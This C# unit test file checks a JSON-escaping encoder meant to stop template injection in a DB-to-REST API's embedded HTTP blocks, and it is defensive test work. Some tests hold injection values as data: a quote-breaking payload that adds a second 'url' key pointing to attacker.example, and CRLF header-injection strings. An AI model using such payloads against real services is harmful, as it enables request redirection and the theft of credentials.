using System.Text.Json;
using Com.H.Data.Common;
using DBToRestAPI.Services.HttpExecutor.Internal;

namespace DBToRestAPI.Tests.HttpExecutor;

/// <summary>
/// Tests for <see cref="EmbeddedHttpTemplate"/>, the context-aware encoder that stops a value
/// substituted into a {http{...}http} block from breaking out of the JSON string it sits in.
///
/// Background: the block is JSON held as text, and {{markers}} are filled in before it is parsed.
/// A value carrying a double quote used to close the string and append sibling keys; because
/// System.Text.Json keeps the LAST duplicate key, a caller could replace "url" outright and
/// redirect the call - together with the block's credential headers - to any host.
/// </summary>
public class EmbeddedHttpTemplateTests
{
    // The default {{ }} / {j{ }} pattern from regex.xml, as registered in qParams by the controller.
    private const string DefaultMarkerRegex = @"(?<open_marker>\{\{|\{j\{)(?<param>.*?)?(?<close_marker>\}\})";

    #region MarkersInsideJsonStrings - classification

    [Fact]
    public void Classify_MarkerInsideStringValue_IsEscaped()
    {
        var template = """{"url": "https://internal/api?x={{p}}"}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out var mixed);

        Assert.Contains("p", inside);
        Assert.Empty(mixed);
    }

    [Fact]
    public void Classify_StructuralMarker_IsLeftRaw()
    {
        // "body": {{obj}} deliberately injects a whole JSON document; escaping it would break it.
        var template = """{"url": "https://internal/api", "body": {{obj}}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out var mixed);

        Assert.DoesNotContain("obj", inside);
        Assert.Empty(mixed);
    }

    [Fact]
    public void Classify_SameMarkerInBothContexts_IsEscapedAndReported()
    {
        var template = """{"url": "https://internal/api?x={{v}}", "body": {{v}}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out var mixed);

        Assert.Contains("v", inside);   // security wins...
        Assert.Contains("v", mixed);    // ...and the caller is told the block needs rewriting
    }

    [Fact]
    public void Classify_PrefixedMarkers_UseInnerName()
    {
        var template = """{"url": "{s{base_url}}/x", "headers": {"X-Key": "{h{X-Key}}", "X-User": "{auth{email}}"}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("base_url", inside);
        Assert.Contains("X-Key", inside);
        Assert.Contains("email", inside);
    }

    [Fact]
    public void Classify_NamesAreCaseInsensitive()
    {
        var template = """{"url": "https://internal/api?x={{Param}}"}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("PARAM", inside);
    }

    [Fact]
    public void Classify_EscapedQuoteInsideString_DoesNotEndTheString()
    {
        // The \" is an escaped quote, so the marker after it is still inside the string.
        var template = """{"note": "say \"hi\" to {{name}}"}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("name", inside);
    }

    [Fact]
    public void Classify_QuoteInsideLineComment_IsIgnored()
    {
        // JsonRequestParser accepts comments; a stray quote in one must not flip string state
        // and misclassify everything after it.
        var template = "{\n  // a \" stray quote in a comment\n  \"url\": \"https://internal/api?x={{p}}\",\n  \"body\": {{obj}}\n}";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out var mixed);

        Assert.Contains("p", inside);
        Assert.DoesNotContain("obj", inside);
        Assert.Empty(mixed);
    }

    [Fact]
    public void Classify_QuoteInsideBlockComment_IsIgnored()
    {
        var template = "{ /* a \" quote */ \"url\": \"https://internal/api?x={{p}}\", \"body\": {{obj}} }";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("p", inside);
        Assert.DoesNotContain("obj", inside);
    }

    [Fact]
    public void Classify_DoubleSlashInsideUrlString_IsNotAComment()
    {
        // The "//" in https:// sits inside a string, so it must not swallow the rest of the line.
        var template = """{"url": "https://internal/api", "headers": {"X-Trace": "{{trace}}"}, "body": {{obj}}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("trace", inside);
        Assert.DoesNotContain("obj", inside);
    }

    [Fact]
    public void Classify_MarkerInsideNestedObjectAndArray_IsEscaped()
    {
        var template = """{"url": "https://internal/api", "body": {"tags": ["{{tag}}"], "who": {"name": "{{name}}"}}}""";

        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        Assert.Contains("tag", inside);
        Assert.Contains("name", inside);
    }

    [Theory]
    [InlineData("")]
    [InlineData(null)]
    public void Classify_EmptyTemplate_ReturnsEmptySets(string? template)
    {
        var inside = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template!, out var mixed);

        Assert.Empty(inside);
        Assert.Empty(mixed);
    }

    #endregion

    #region JsonEscape

    [Fact]
    public void JsonEscape_WellFormedValue_PassesThroughUnchanged()
    {
        const string value = "784-1990-1234567-1 / John O'Neil <j@x.io> ?a=1&b=2 #frag ünïcödé 😀";

        Assert.Equal(value, EmbeddedHttpTemplate.JsonEscape(value));
    }

    [Theory]
    [InlineData("\"", "\\\"")]
    [InlineData("\\", "\\\\")]
    [InlineData("\n", "\\n")]
    [InlineData("\r", "\\r")]
    [InlineData("\t", "\\t")]
    [InlineData("\b", "\\b")]
    [InlineData("\f", "\\f")]
    [InlineData("", "\\u0001")]
    [InlineData("", "\\u001f")]
    public void JsonEscape_StructuralAndControlCharacters_AreEscaped(string input, string expected)
    {
        Assert.Equal(expected, EmbeddedHttpTemplate.JsonEscape(input));
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    public void JsonEscape_NullOrEmpty_ReturnsEmpty(string? input)
    {
        Assert.Equal(string.Empty, EmbeddedHttpTemplate.JsonEscape(input));
    }

    [Fact]
    public void JsonEscape_Output_RoundTripsAsAJsonString()
    {
        // Whatever goes in, wrapping the output in quotes must give a JSON string literal that
        // deserializes back to the original value.
        const string value = "a\",\"url\":\"https://attacker.example\\ \n\t";

        var json = "\"" + EmbeddedHttpTemplate.JsonEscape(value) + "\"";

        Assert.Equal(value, JsonSerializer.Deserialize<string>(json));
    }

    #endregion

    #region ContainsHeaderBreak

    [Theory]
    [InlineData("a\r\nX-Injected: b", true)]
    [InlineData("a\nX-Injected: b", true)]
    [InlineData("a\rX-Injected: b", true)]
    [InlineData("plain value", false)]
    [InlineData("", false)]
    [InlineData(null, false)]
    public void ContainsHeaderBreak_DetectsCrAndLfOnly(string? value, bool expected)
    {
        Assert.Equal(expected, EmbeddedHttpTemplate.ContainsHeaderBreak(value));
    }

    #endregion

    #region End to end - the fill the controller actually performs

    /// <summary>
    /// Mirrors ApiController's embedded-HTTP fill: classify the markers, then Fill with a
    /// converter that escapes only the ones that land inside a JSON string.
    /// </summary>
    private static string FillLikeController(string template, Dictionary<string, object?> values)
    {
        var qParams = new List<DbQueryParams>
        {
            new() { DataModel = values, QueryParamsRegex = DefaultMarkerRegex }
        };

        var jsonStringMarkers = EmbeddedHttpTemplate.MarkersInsideJsonStrings(template, out _);

        return template.Fill(
            qParams,
            valueConverter: (name, value) =>
            {
                var text = value?.ToString() ?? string.Empty;
                return jsonStringMarkers.Contains(name)
                    ? EmbeddedHttpTemplate.JsonEscape(text)
                    : text;
            });
    }

    [Fact]
    public void Fill_SsrfPayloadInUrlMarker_CannotReplaceTheUrl()
    {
        // The original exploit: a value that closes the string and appends a second "url" key.
        var template = """
            {
              "url": "https://internal/api?x={{p}}",
              "headers": { "x-api-key": "secret" }
            }
            """;
        const string payload = "a\",\"url\":\"https://attacker.example";

        var filled = FillLikeController(template, new() { ["p"] = payload });
        var request = JsonRequestParser.Parse(filled);

        // Still one url key, still the internal host, and the payload is trapped inside it as data.
        Assert.StartsWith("https://internal/api?x=", request.Url);
        Assert.Equal("https://internal/api?x=" + payload, request.Url);
        Assert.Equal("secret", request.Headers!["x-api-key"]);
    }

    [Fact]
    public void Fill_WellFormedValue_IsUnchanged()
    {
        var template = """{"url": "https://internal/api?id={{id}}"}""";

        var filled = FillLikeController(template, new() { ["id"] = "784-1990-1234567-1" });

        Assert.Equal("https://internal/api?id=784-1990-1234567-1", JsonRequestParser.Parse(filled).Url);
    }

    [Fact]
    public void Fill_StructuralBodyMarker_StillInjectsAJsonDocument()
    {
        // The supported "inject a whole document" pattern must keep working unescaped.
        var template = """{"url": "https://internal/api", "method": "POST", "body": {{body_add}}}""";

        var filled = FillLikeController(template, new() { ["body_add"] = """{"a": 1, "b": [1, 2]}""" });
        var request = JsonRequestParser.Parse(filled);

        var body = Assert.IsType<JsonElement>(request.Body);
        Assert.Equal(1, body.GetProperty("a").GetInt32());
        Assert.Equal(2, body.GetProperty("b").GetArrayLength());
    }

    [Fact]
    public void Fill_QueryStringMarkerValue_PassesThroughUntouched()
    {
        // A whole query string ("?scenario=x&shape=y") has no JSON-structural characters, so it
        // must arrive exactly as written.
        var template = """{"url": "https://internal/api{{url_suffix}}"}""";

        var filled = FillLikeController(template, new() { ["url_suffix"] = "?scenario=full&shape=wide" });

        Assert.Equal("https://internal/api?scenario=full&shape=wide", JsonRequestParser.Parse(filled).Url);
    }

    #endregion
}
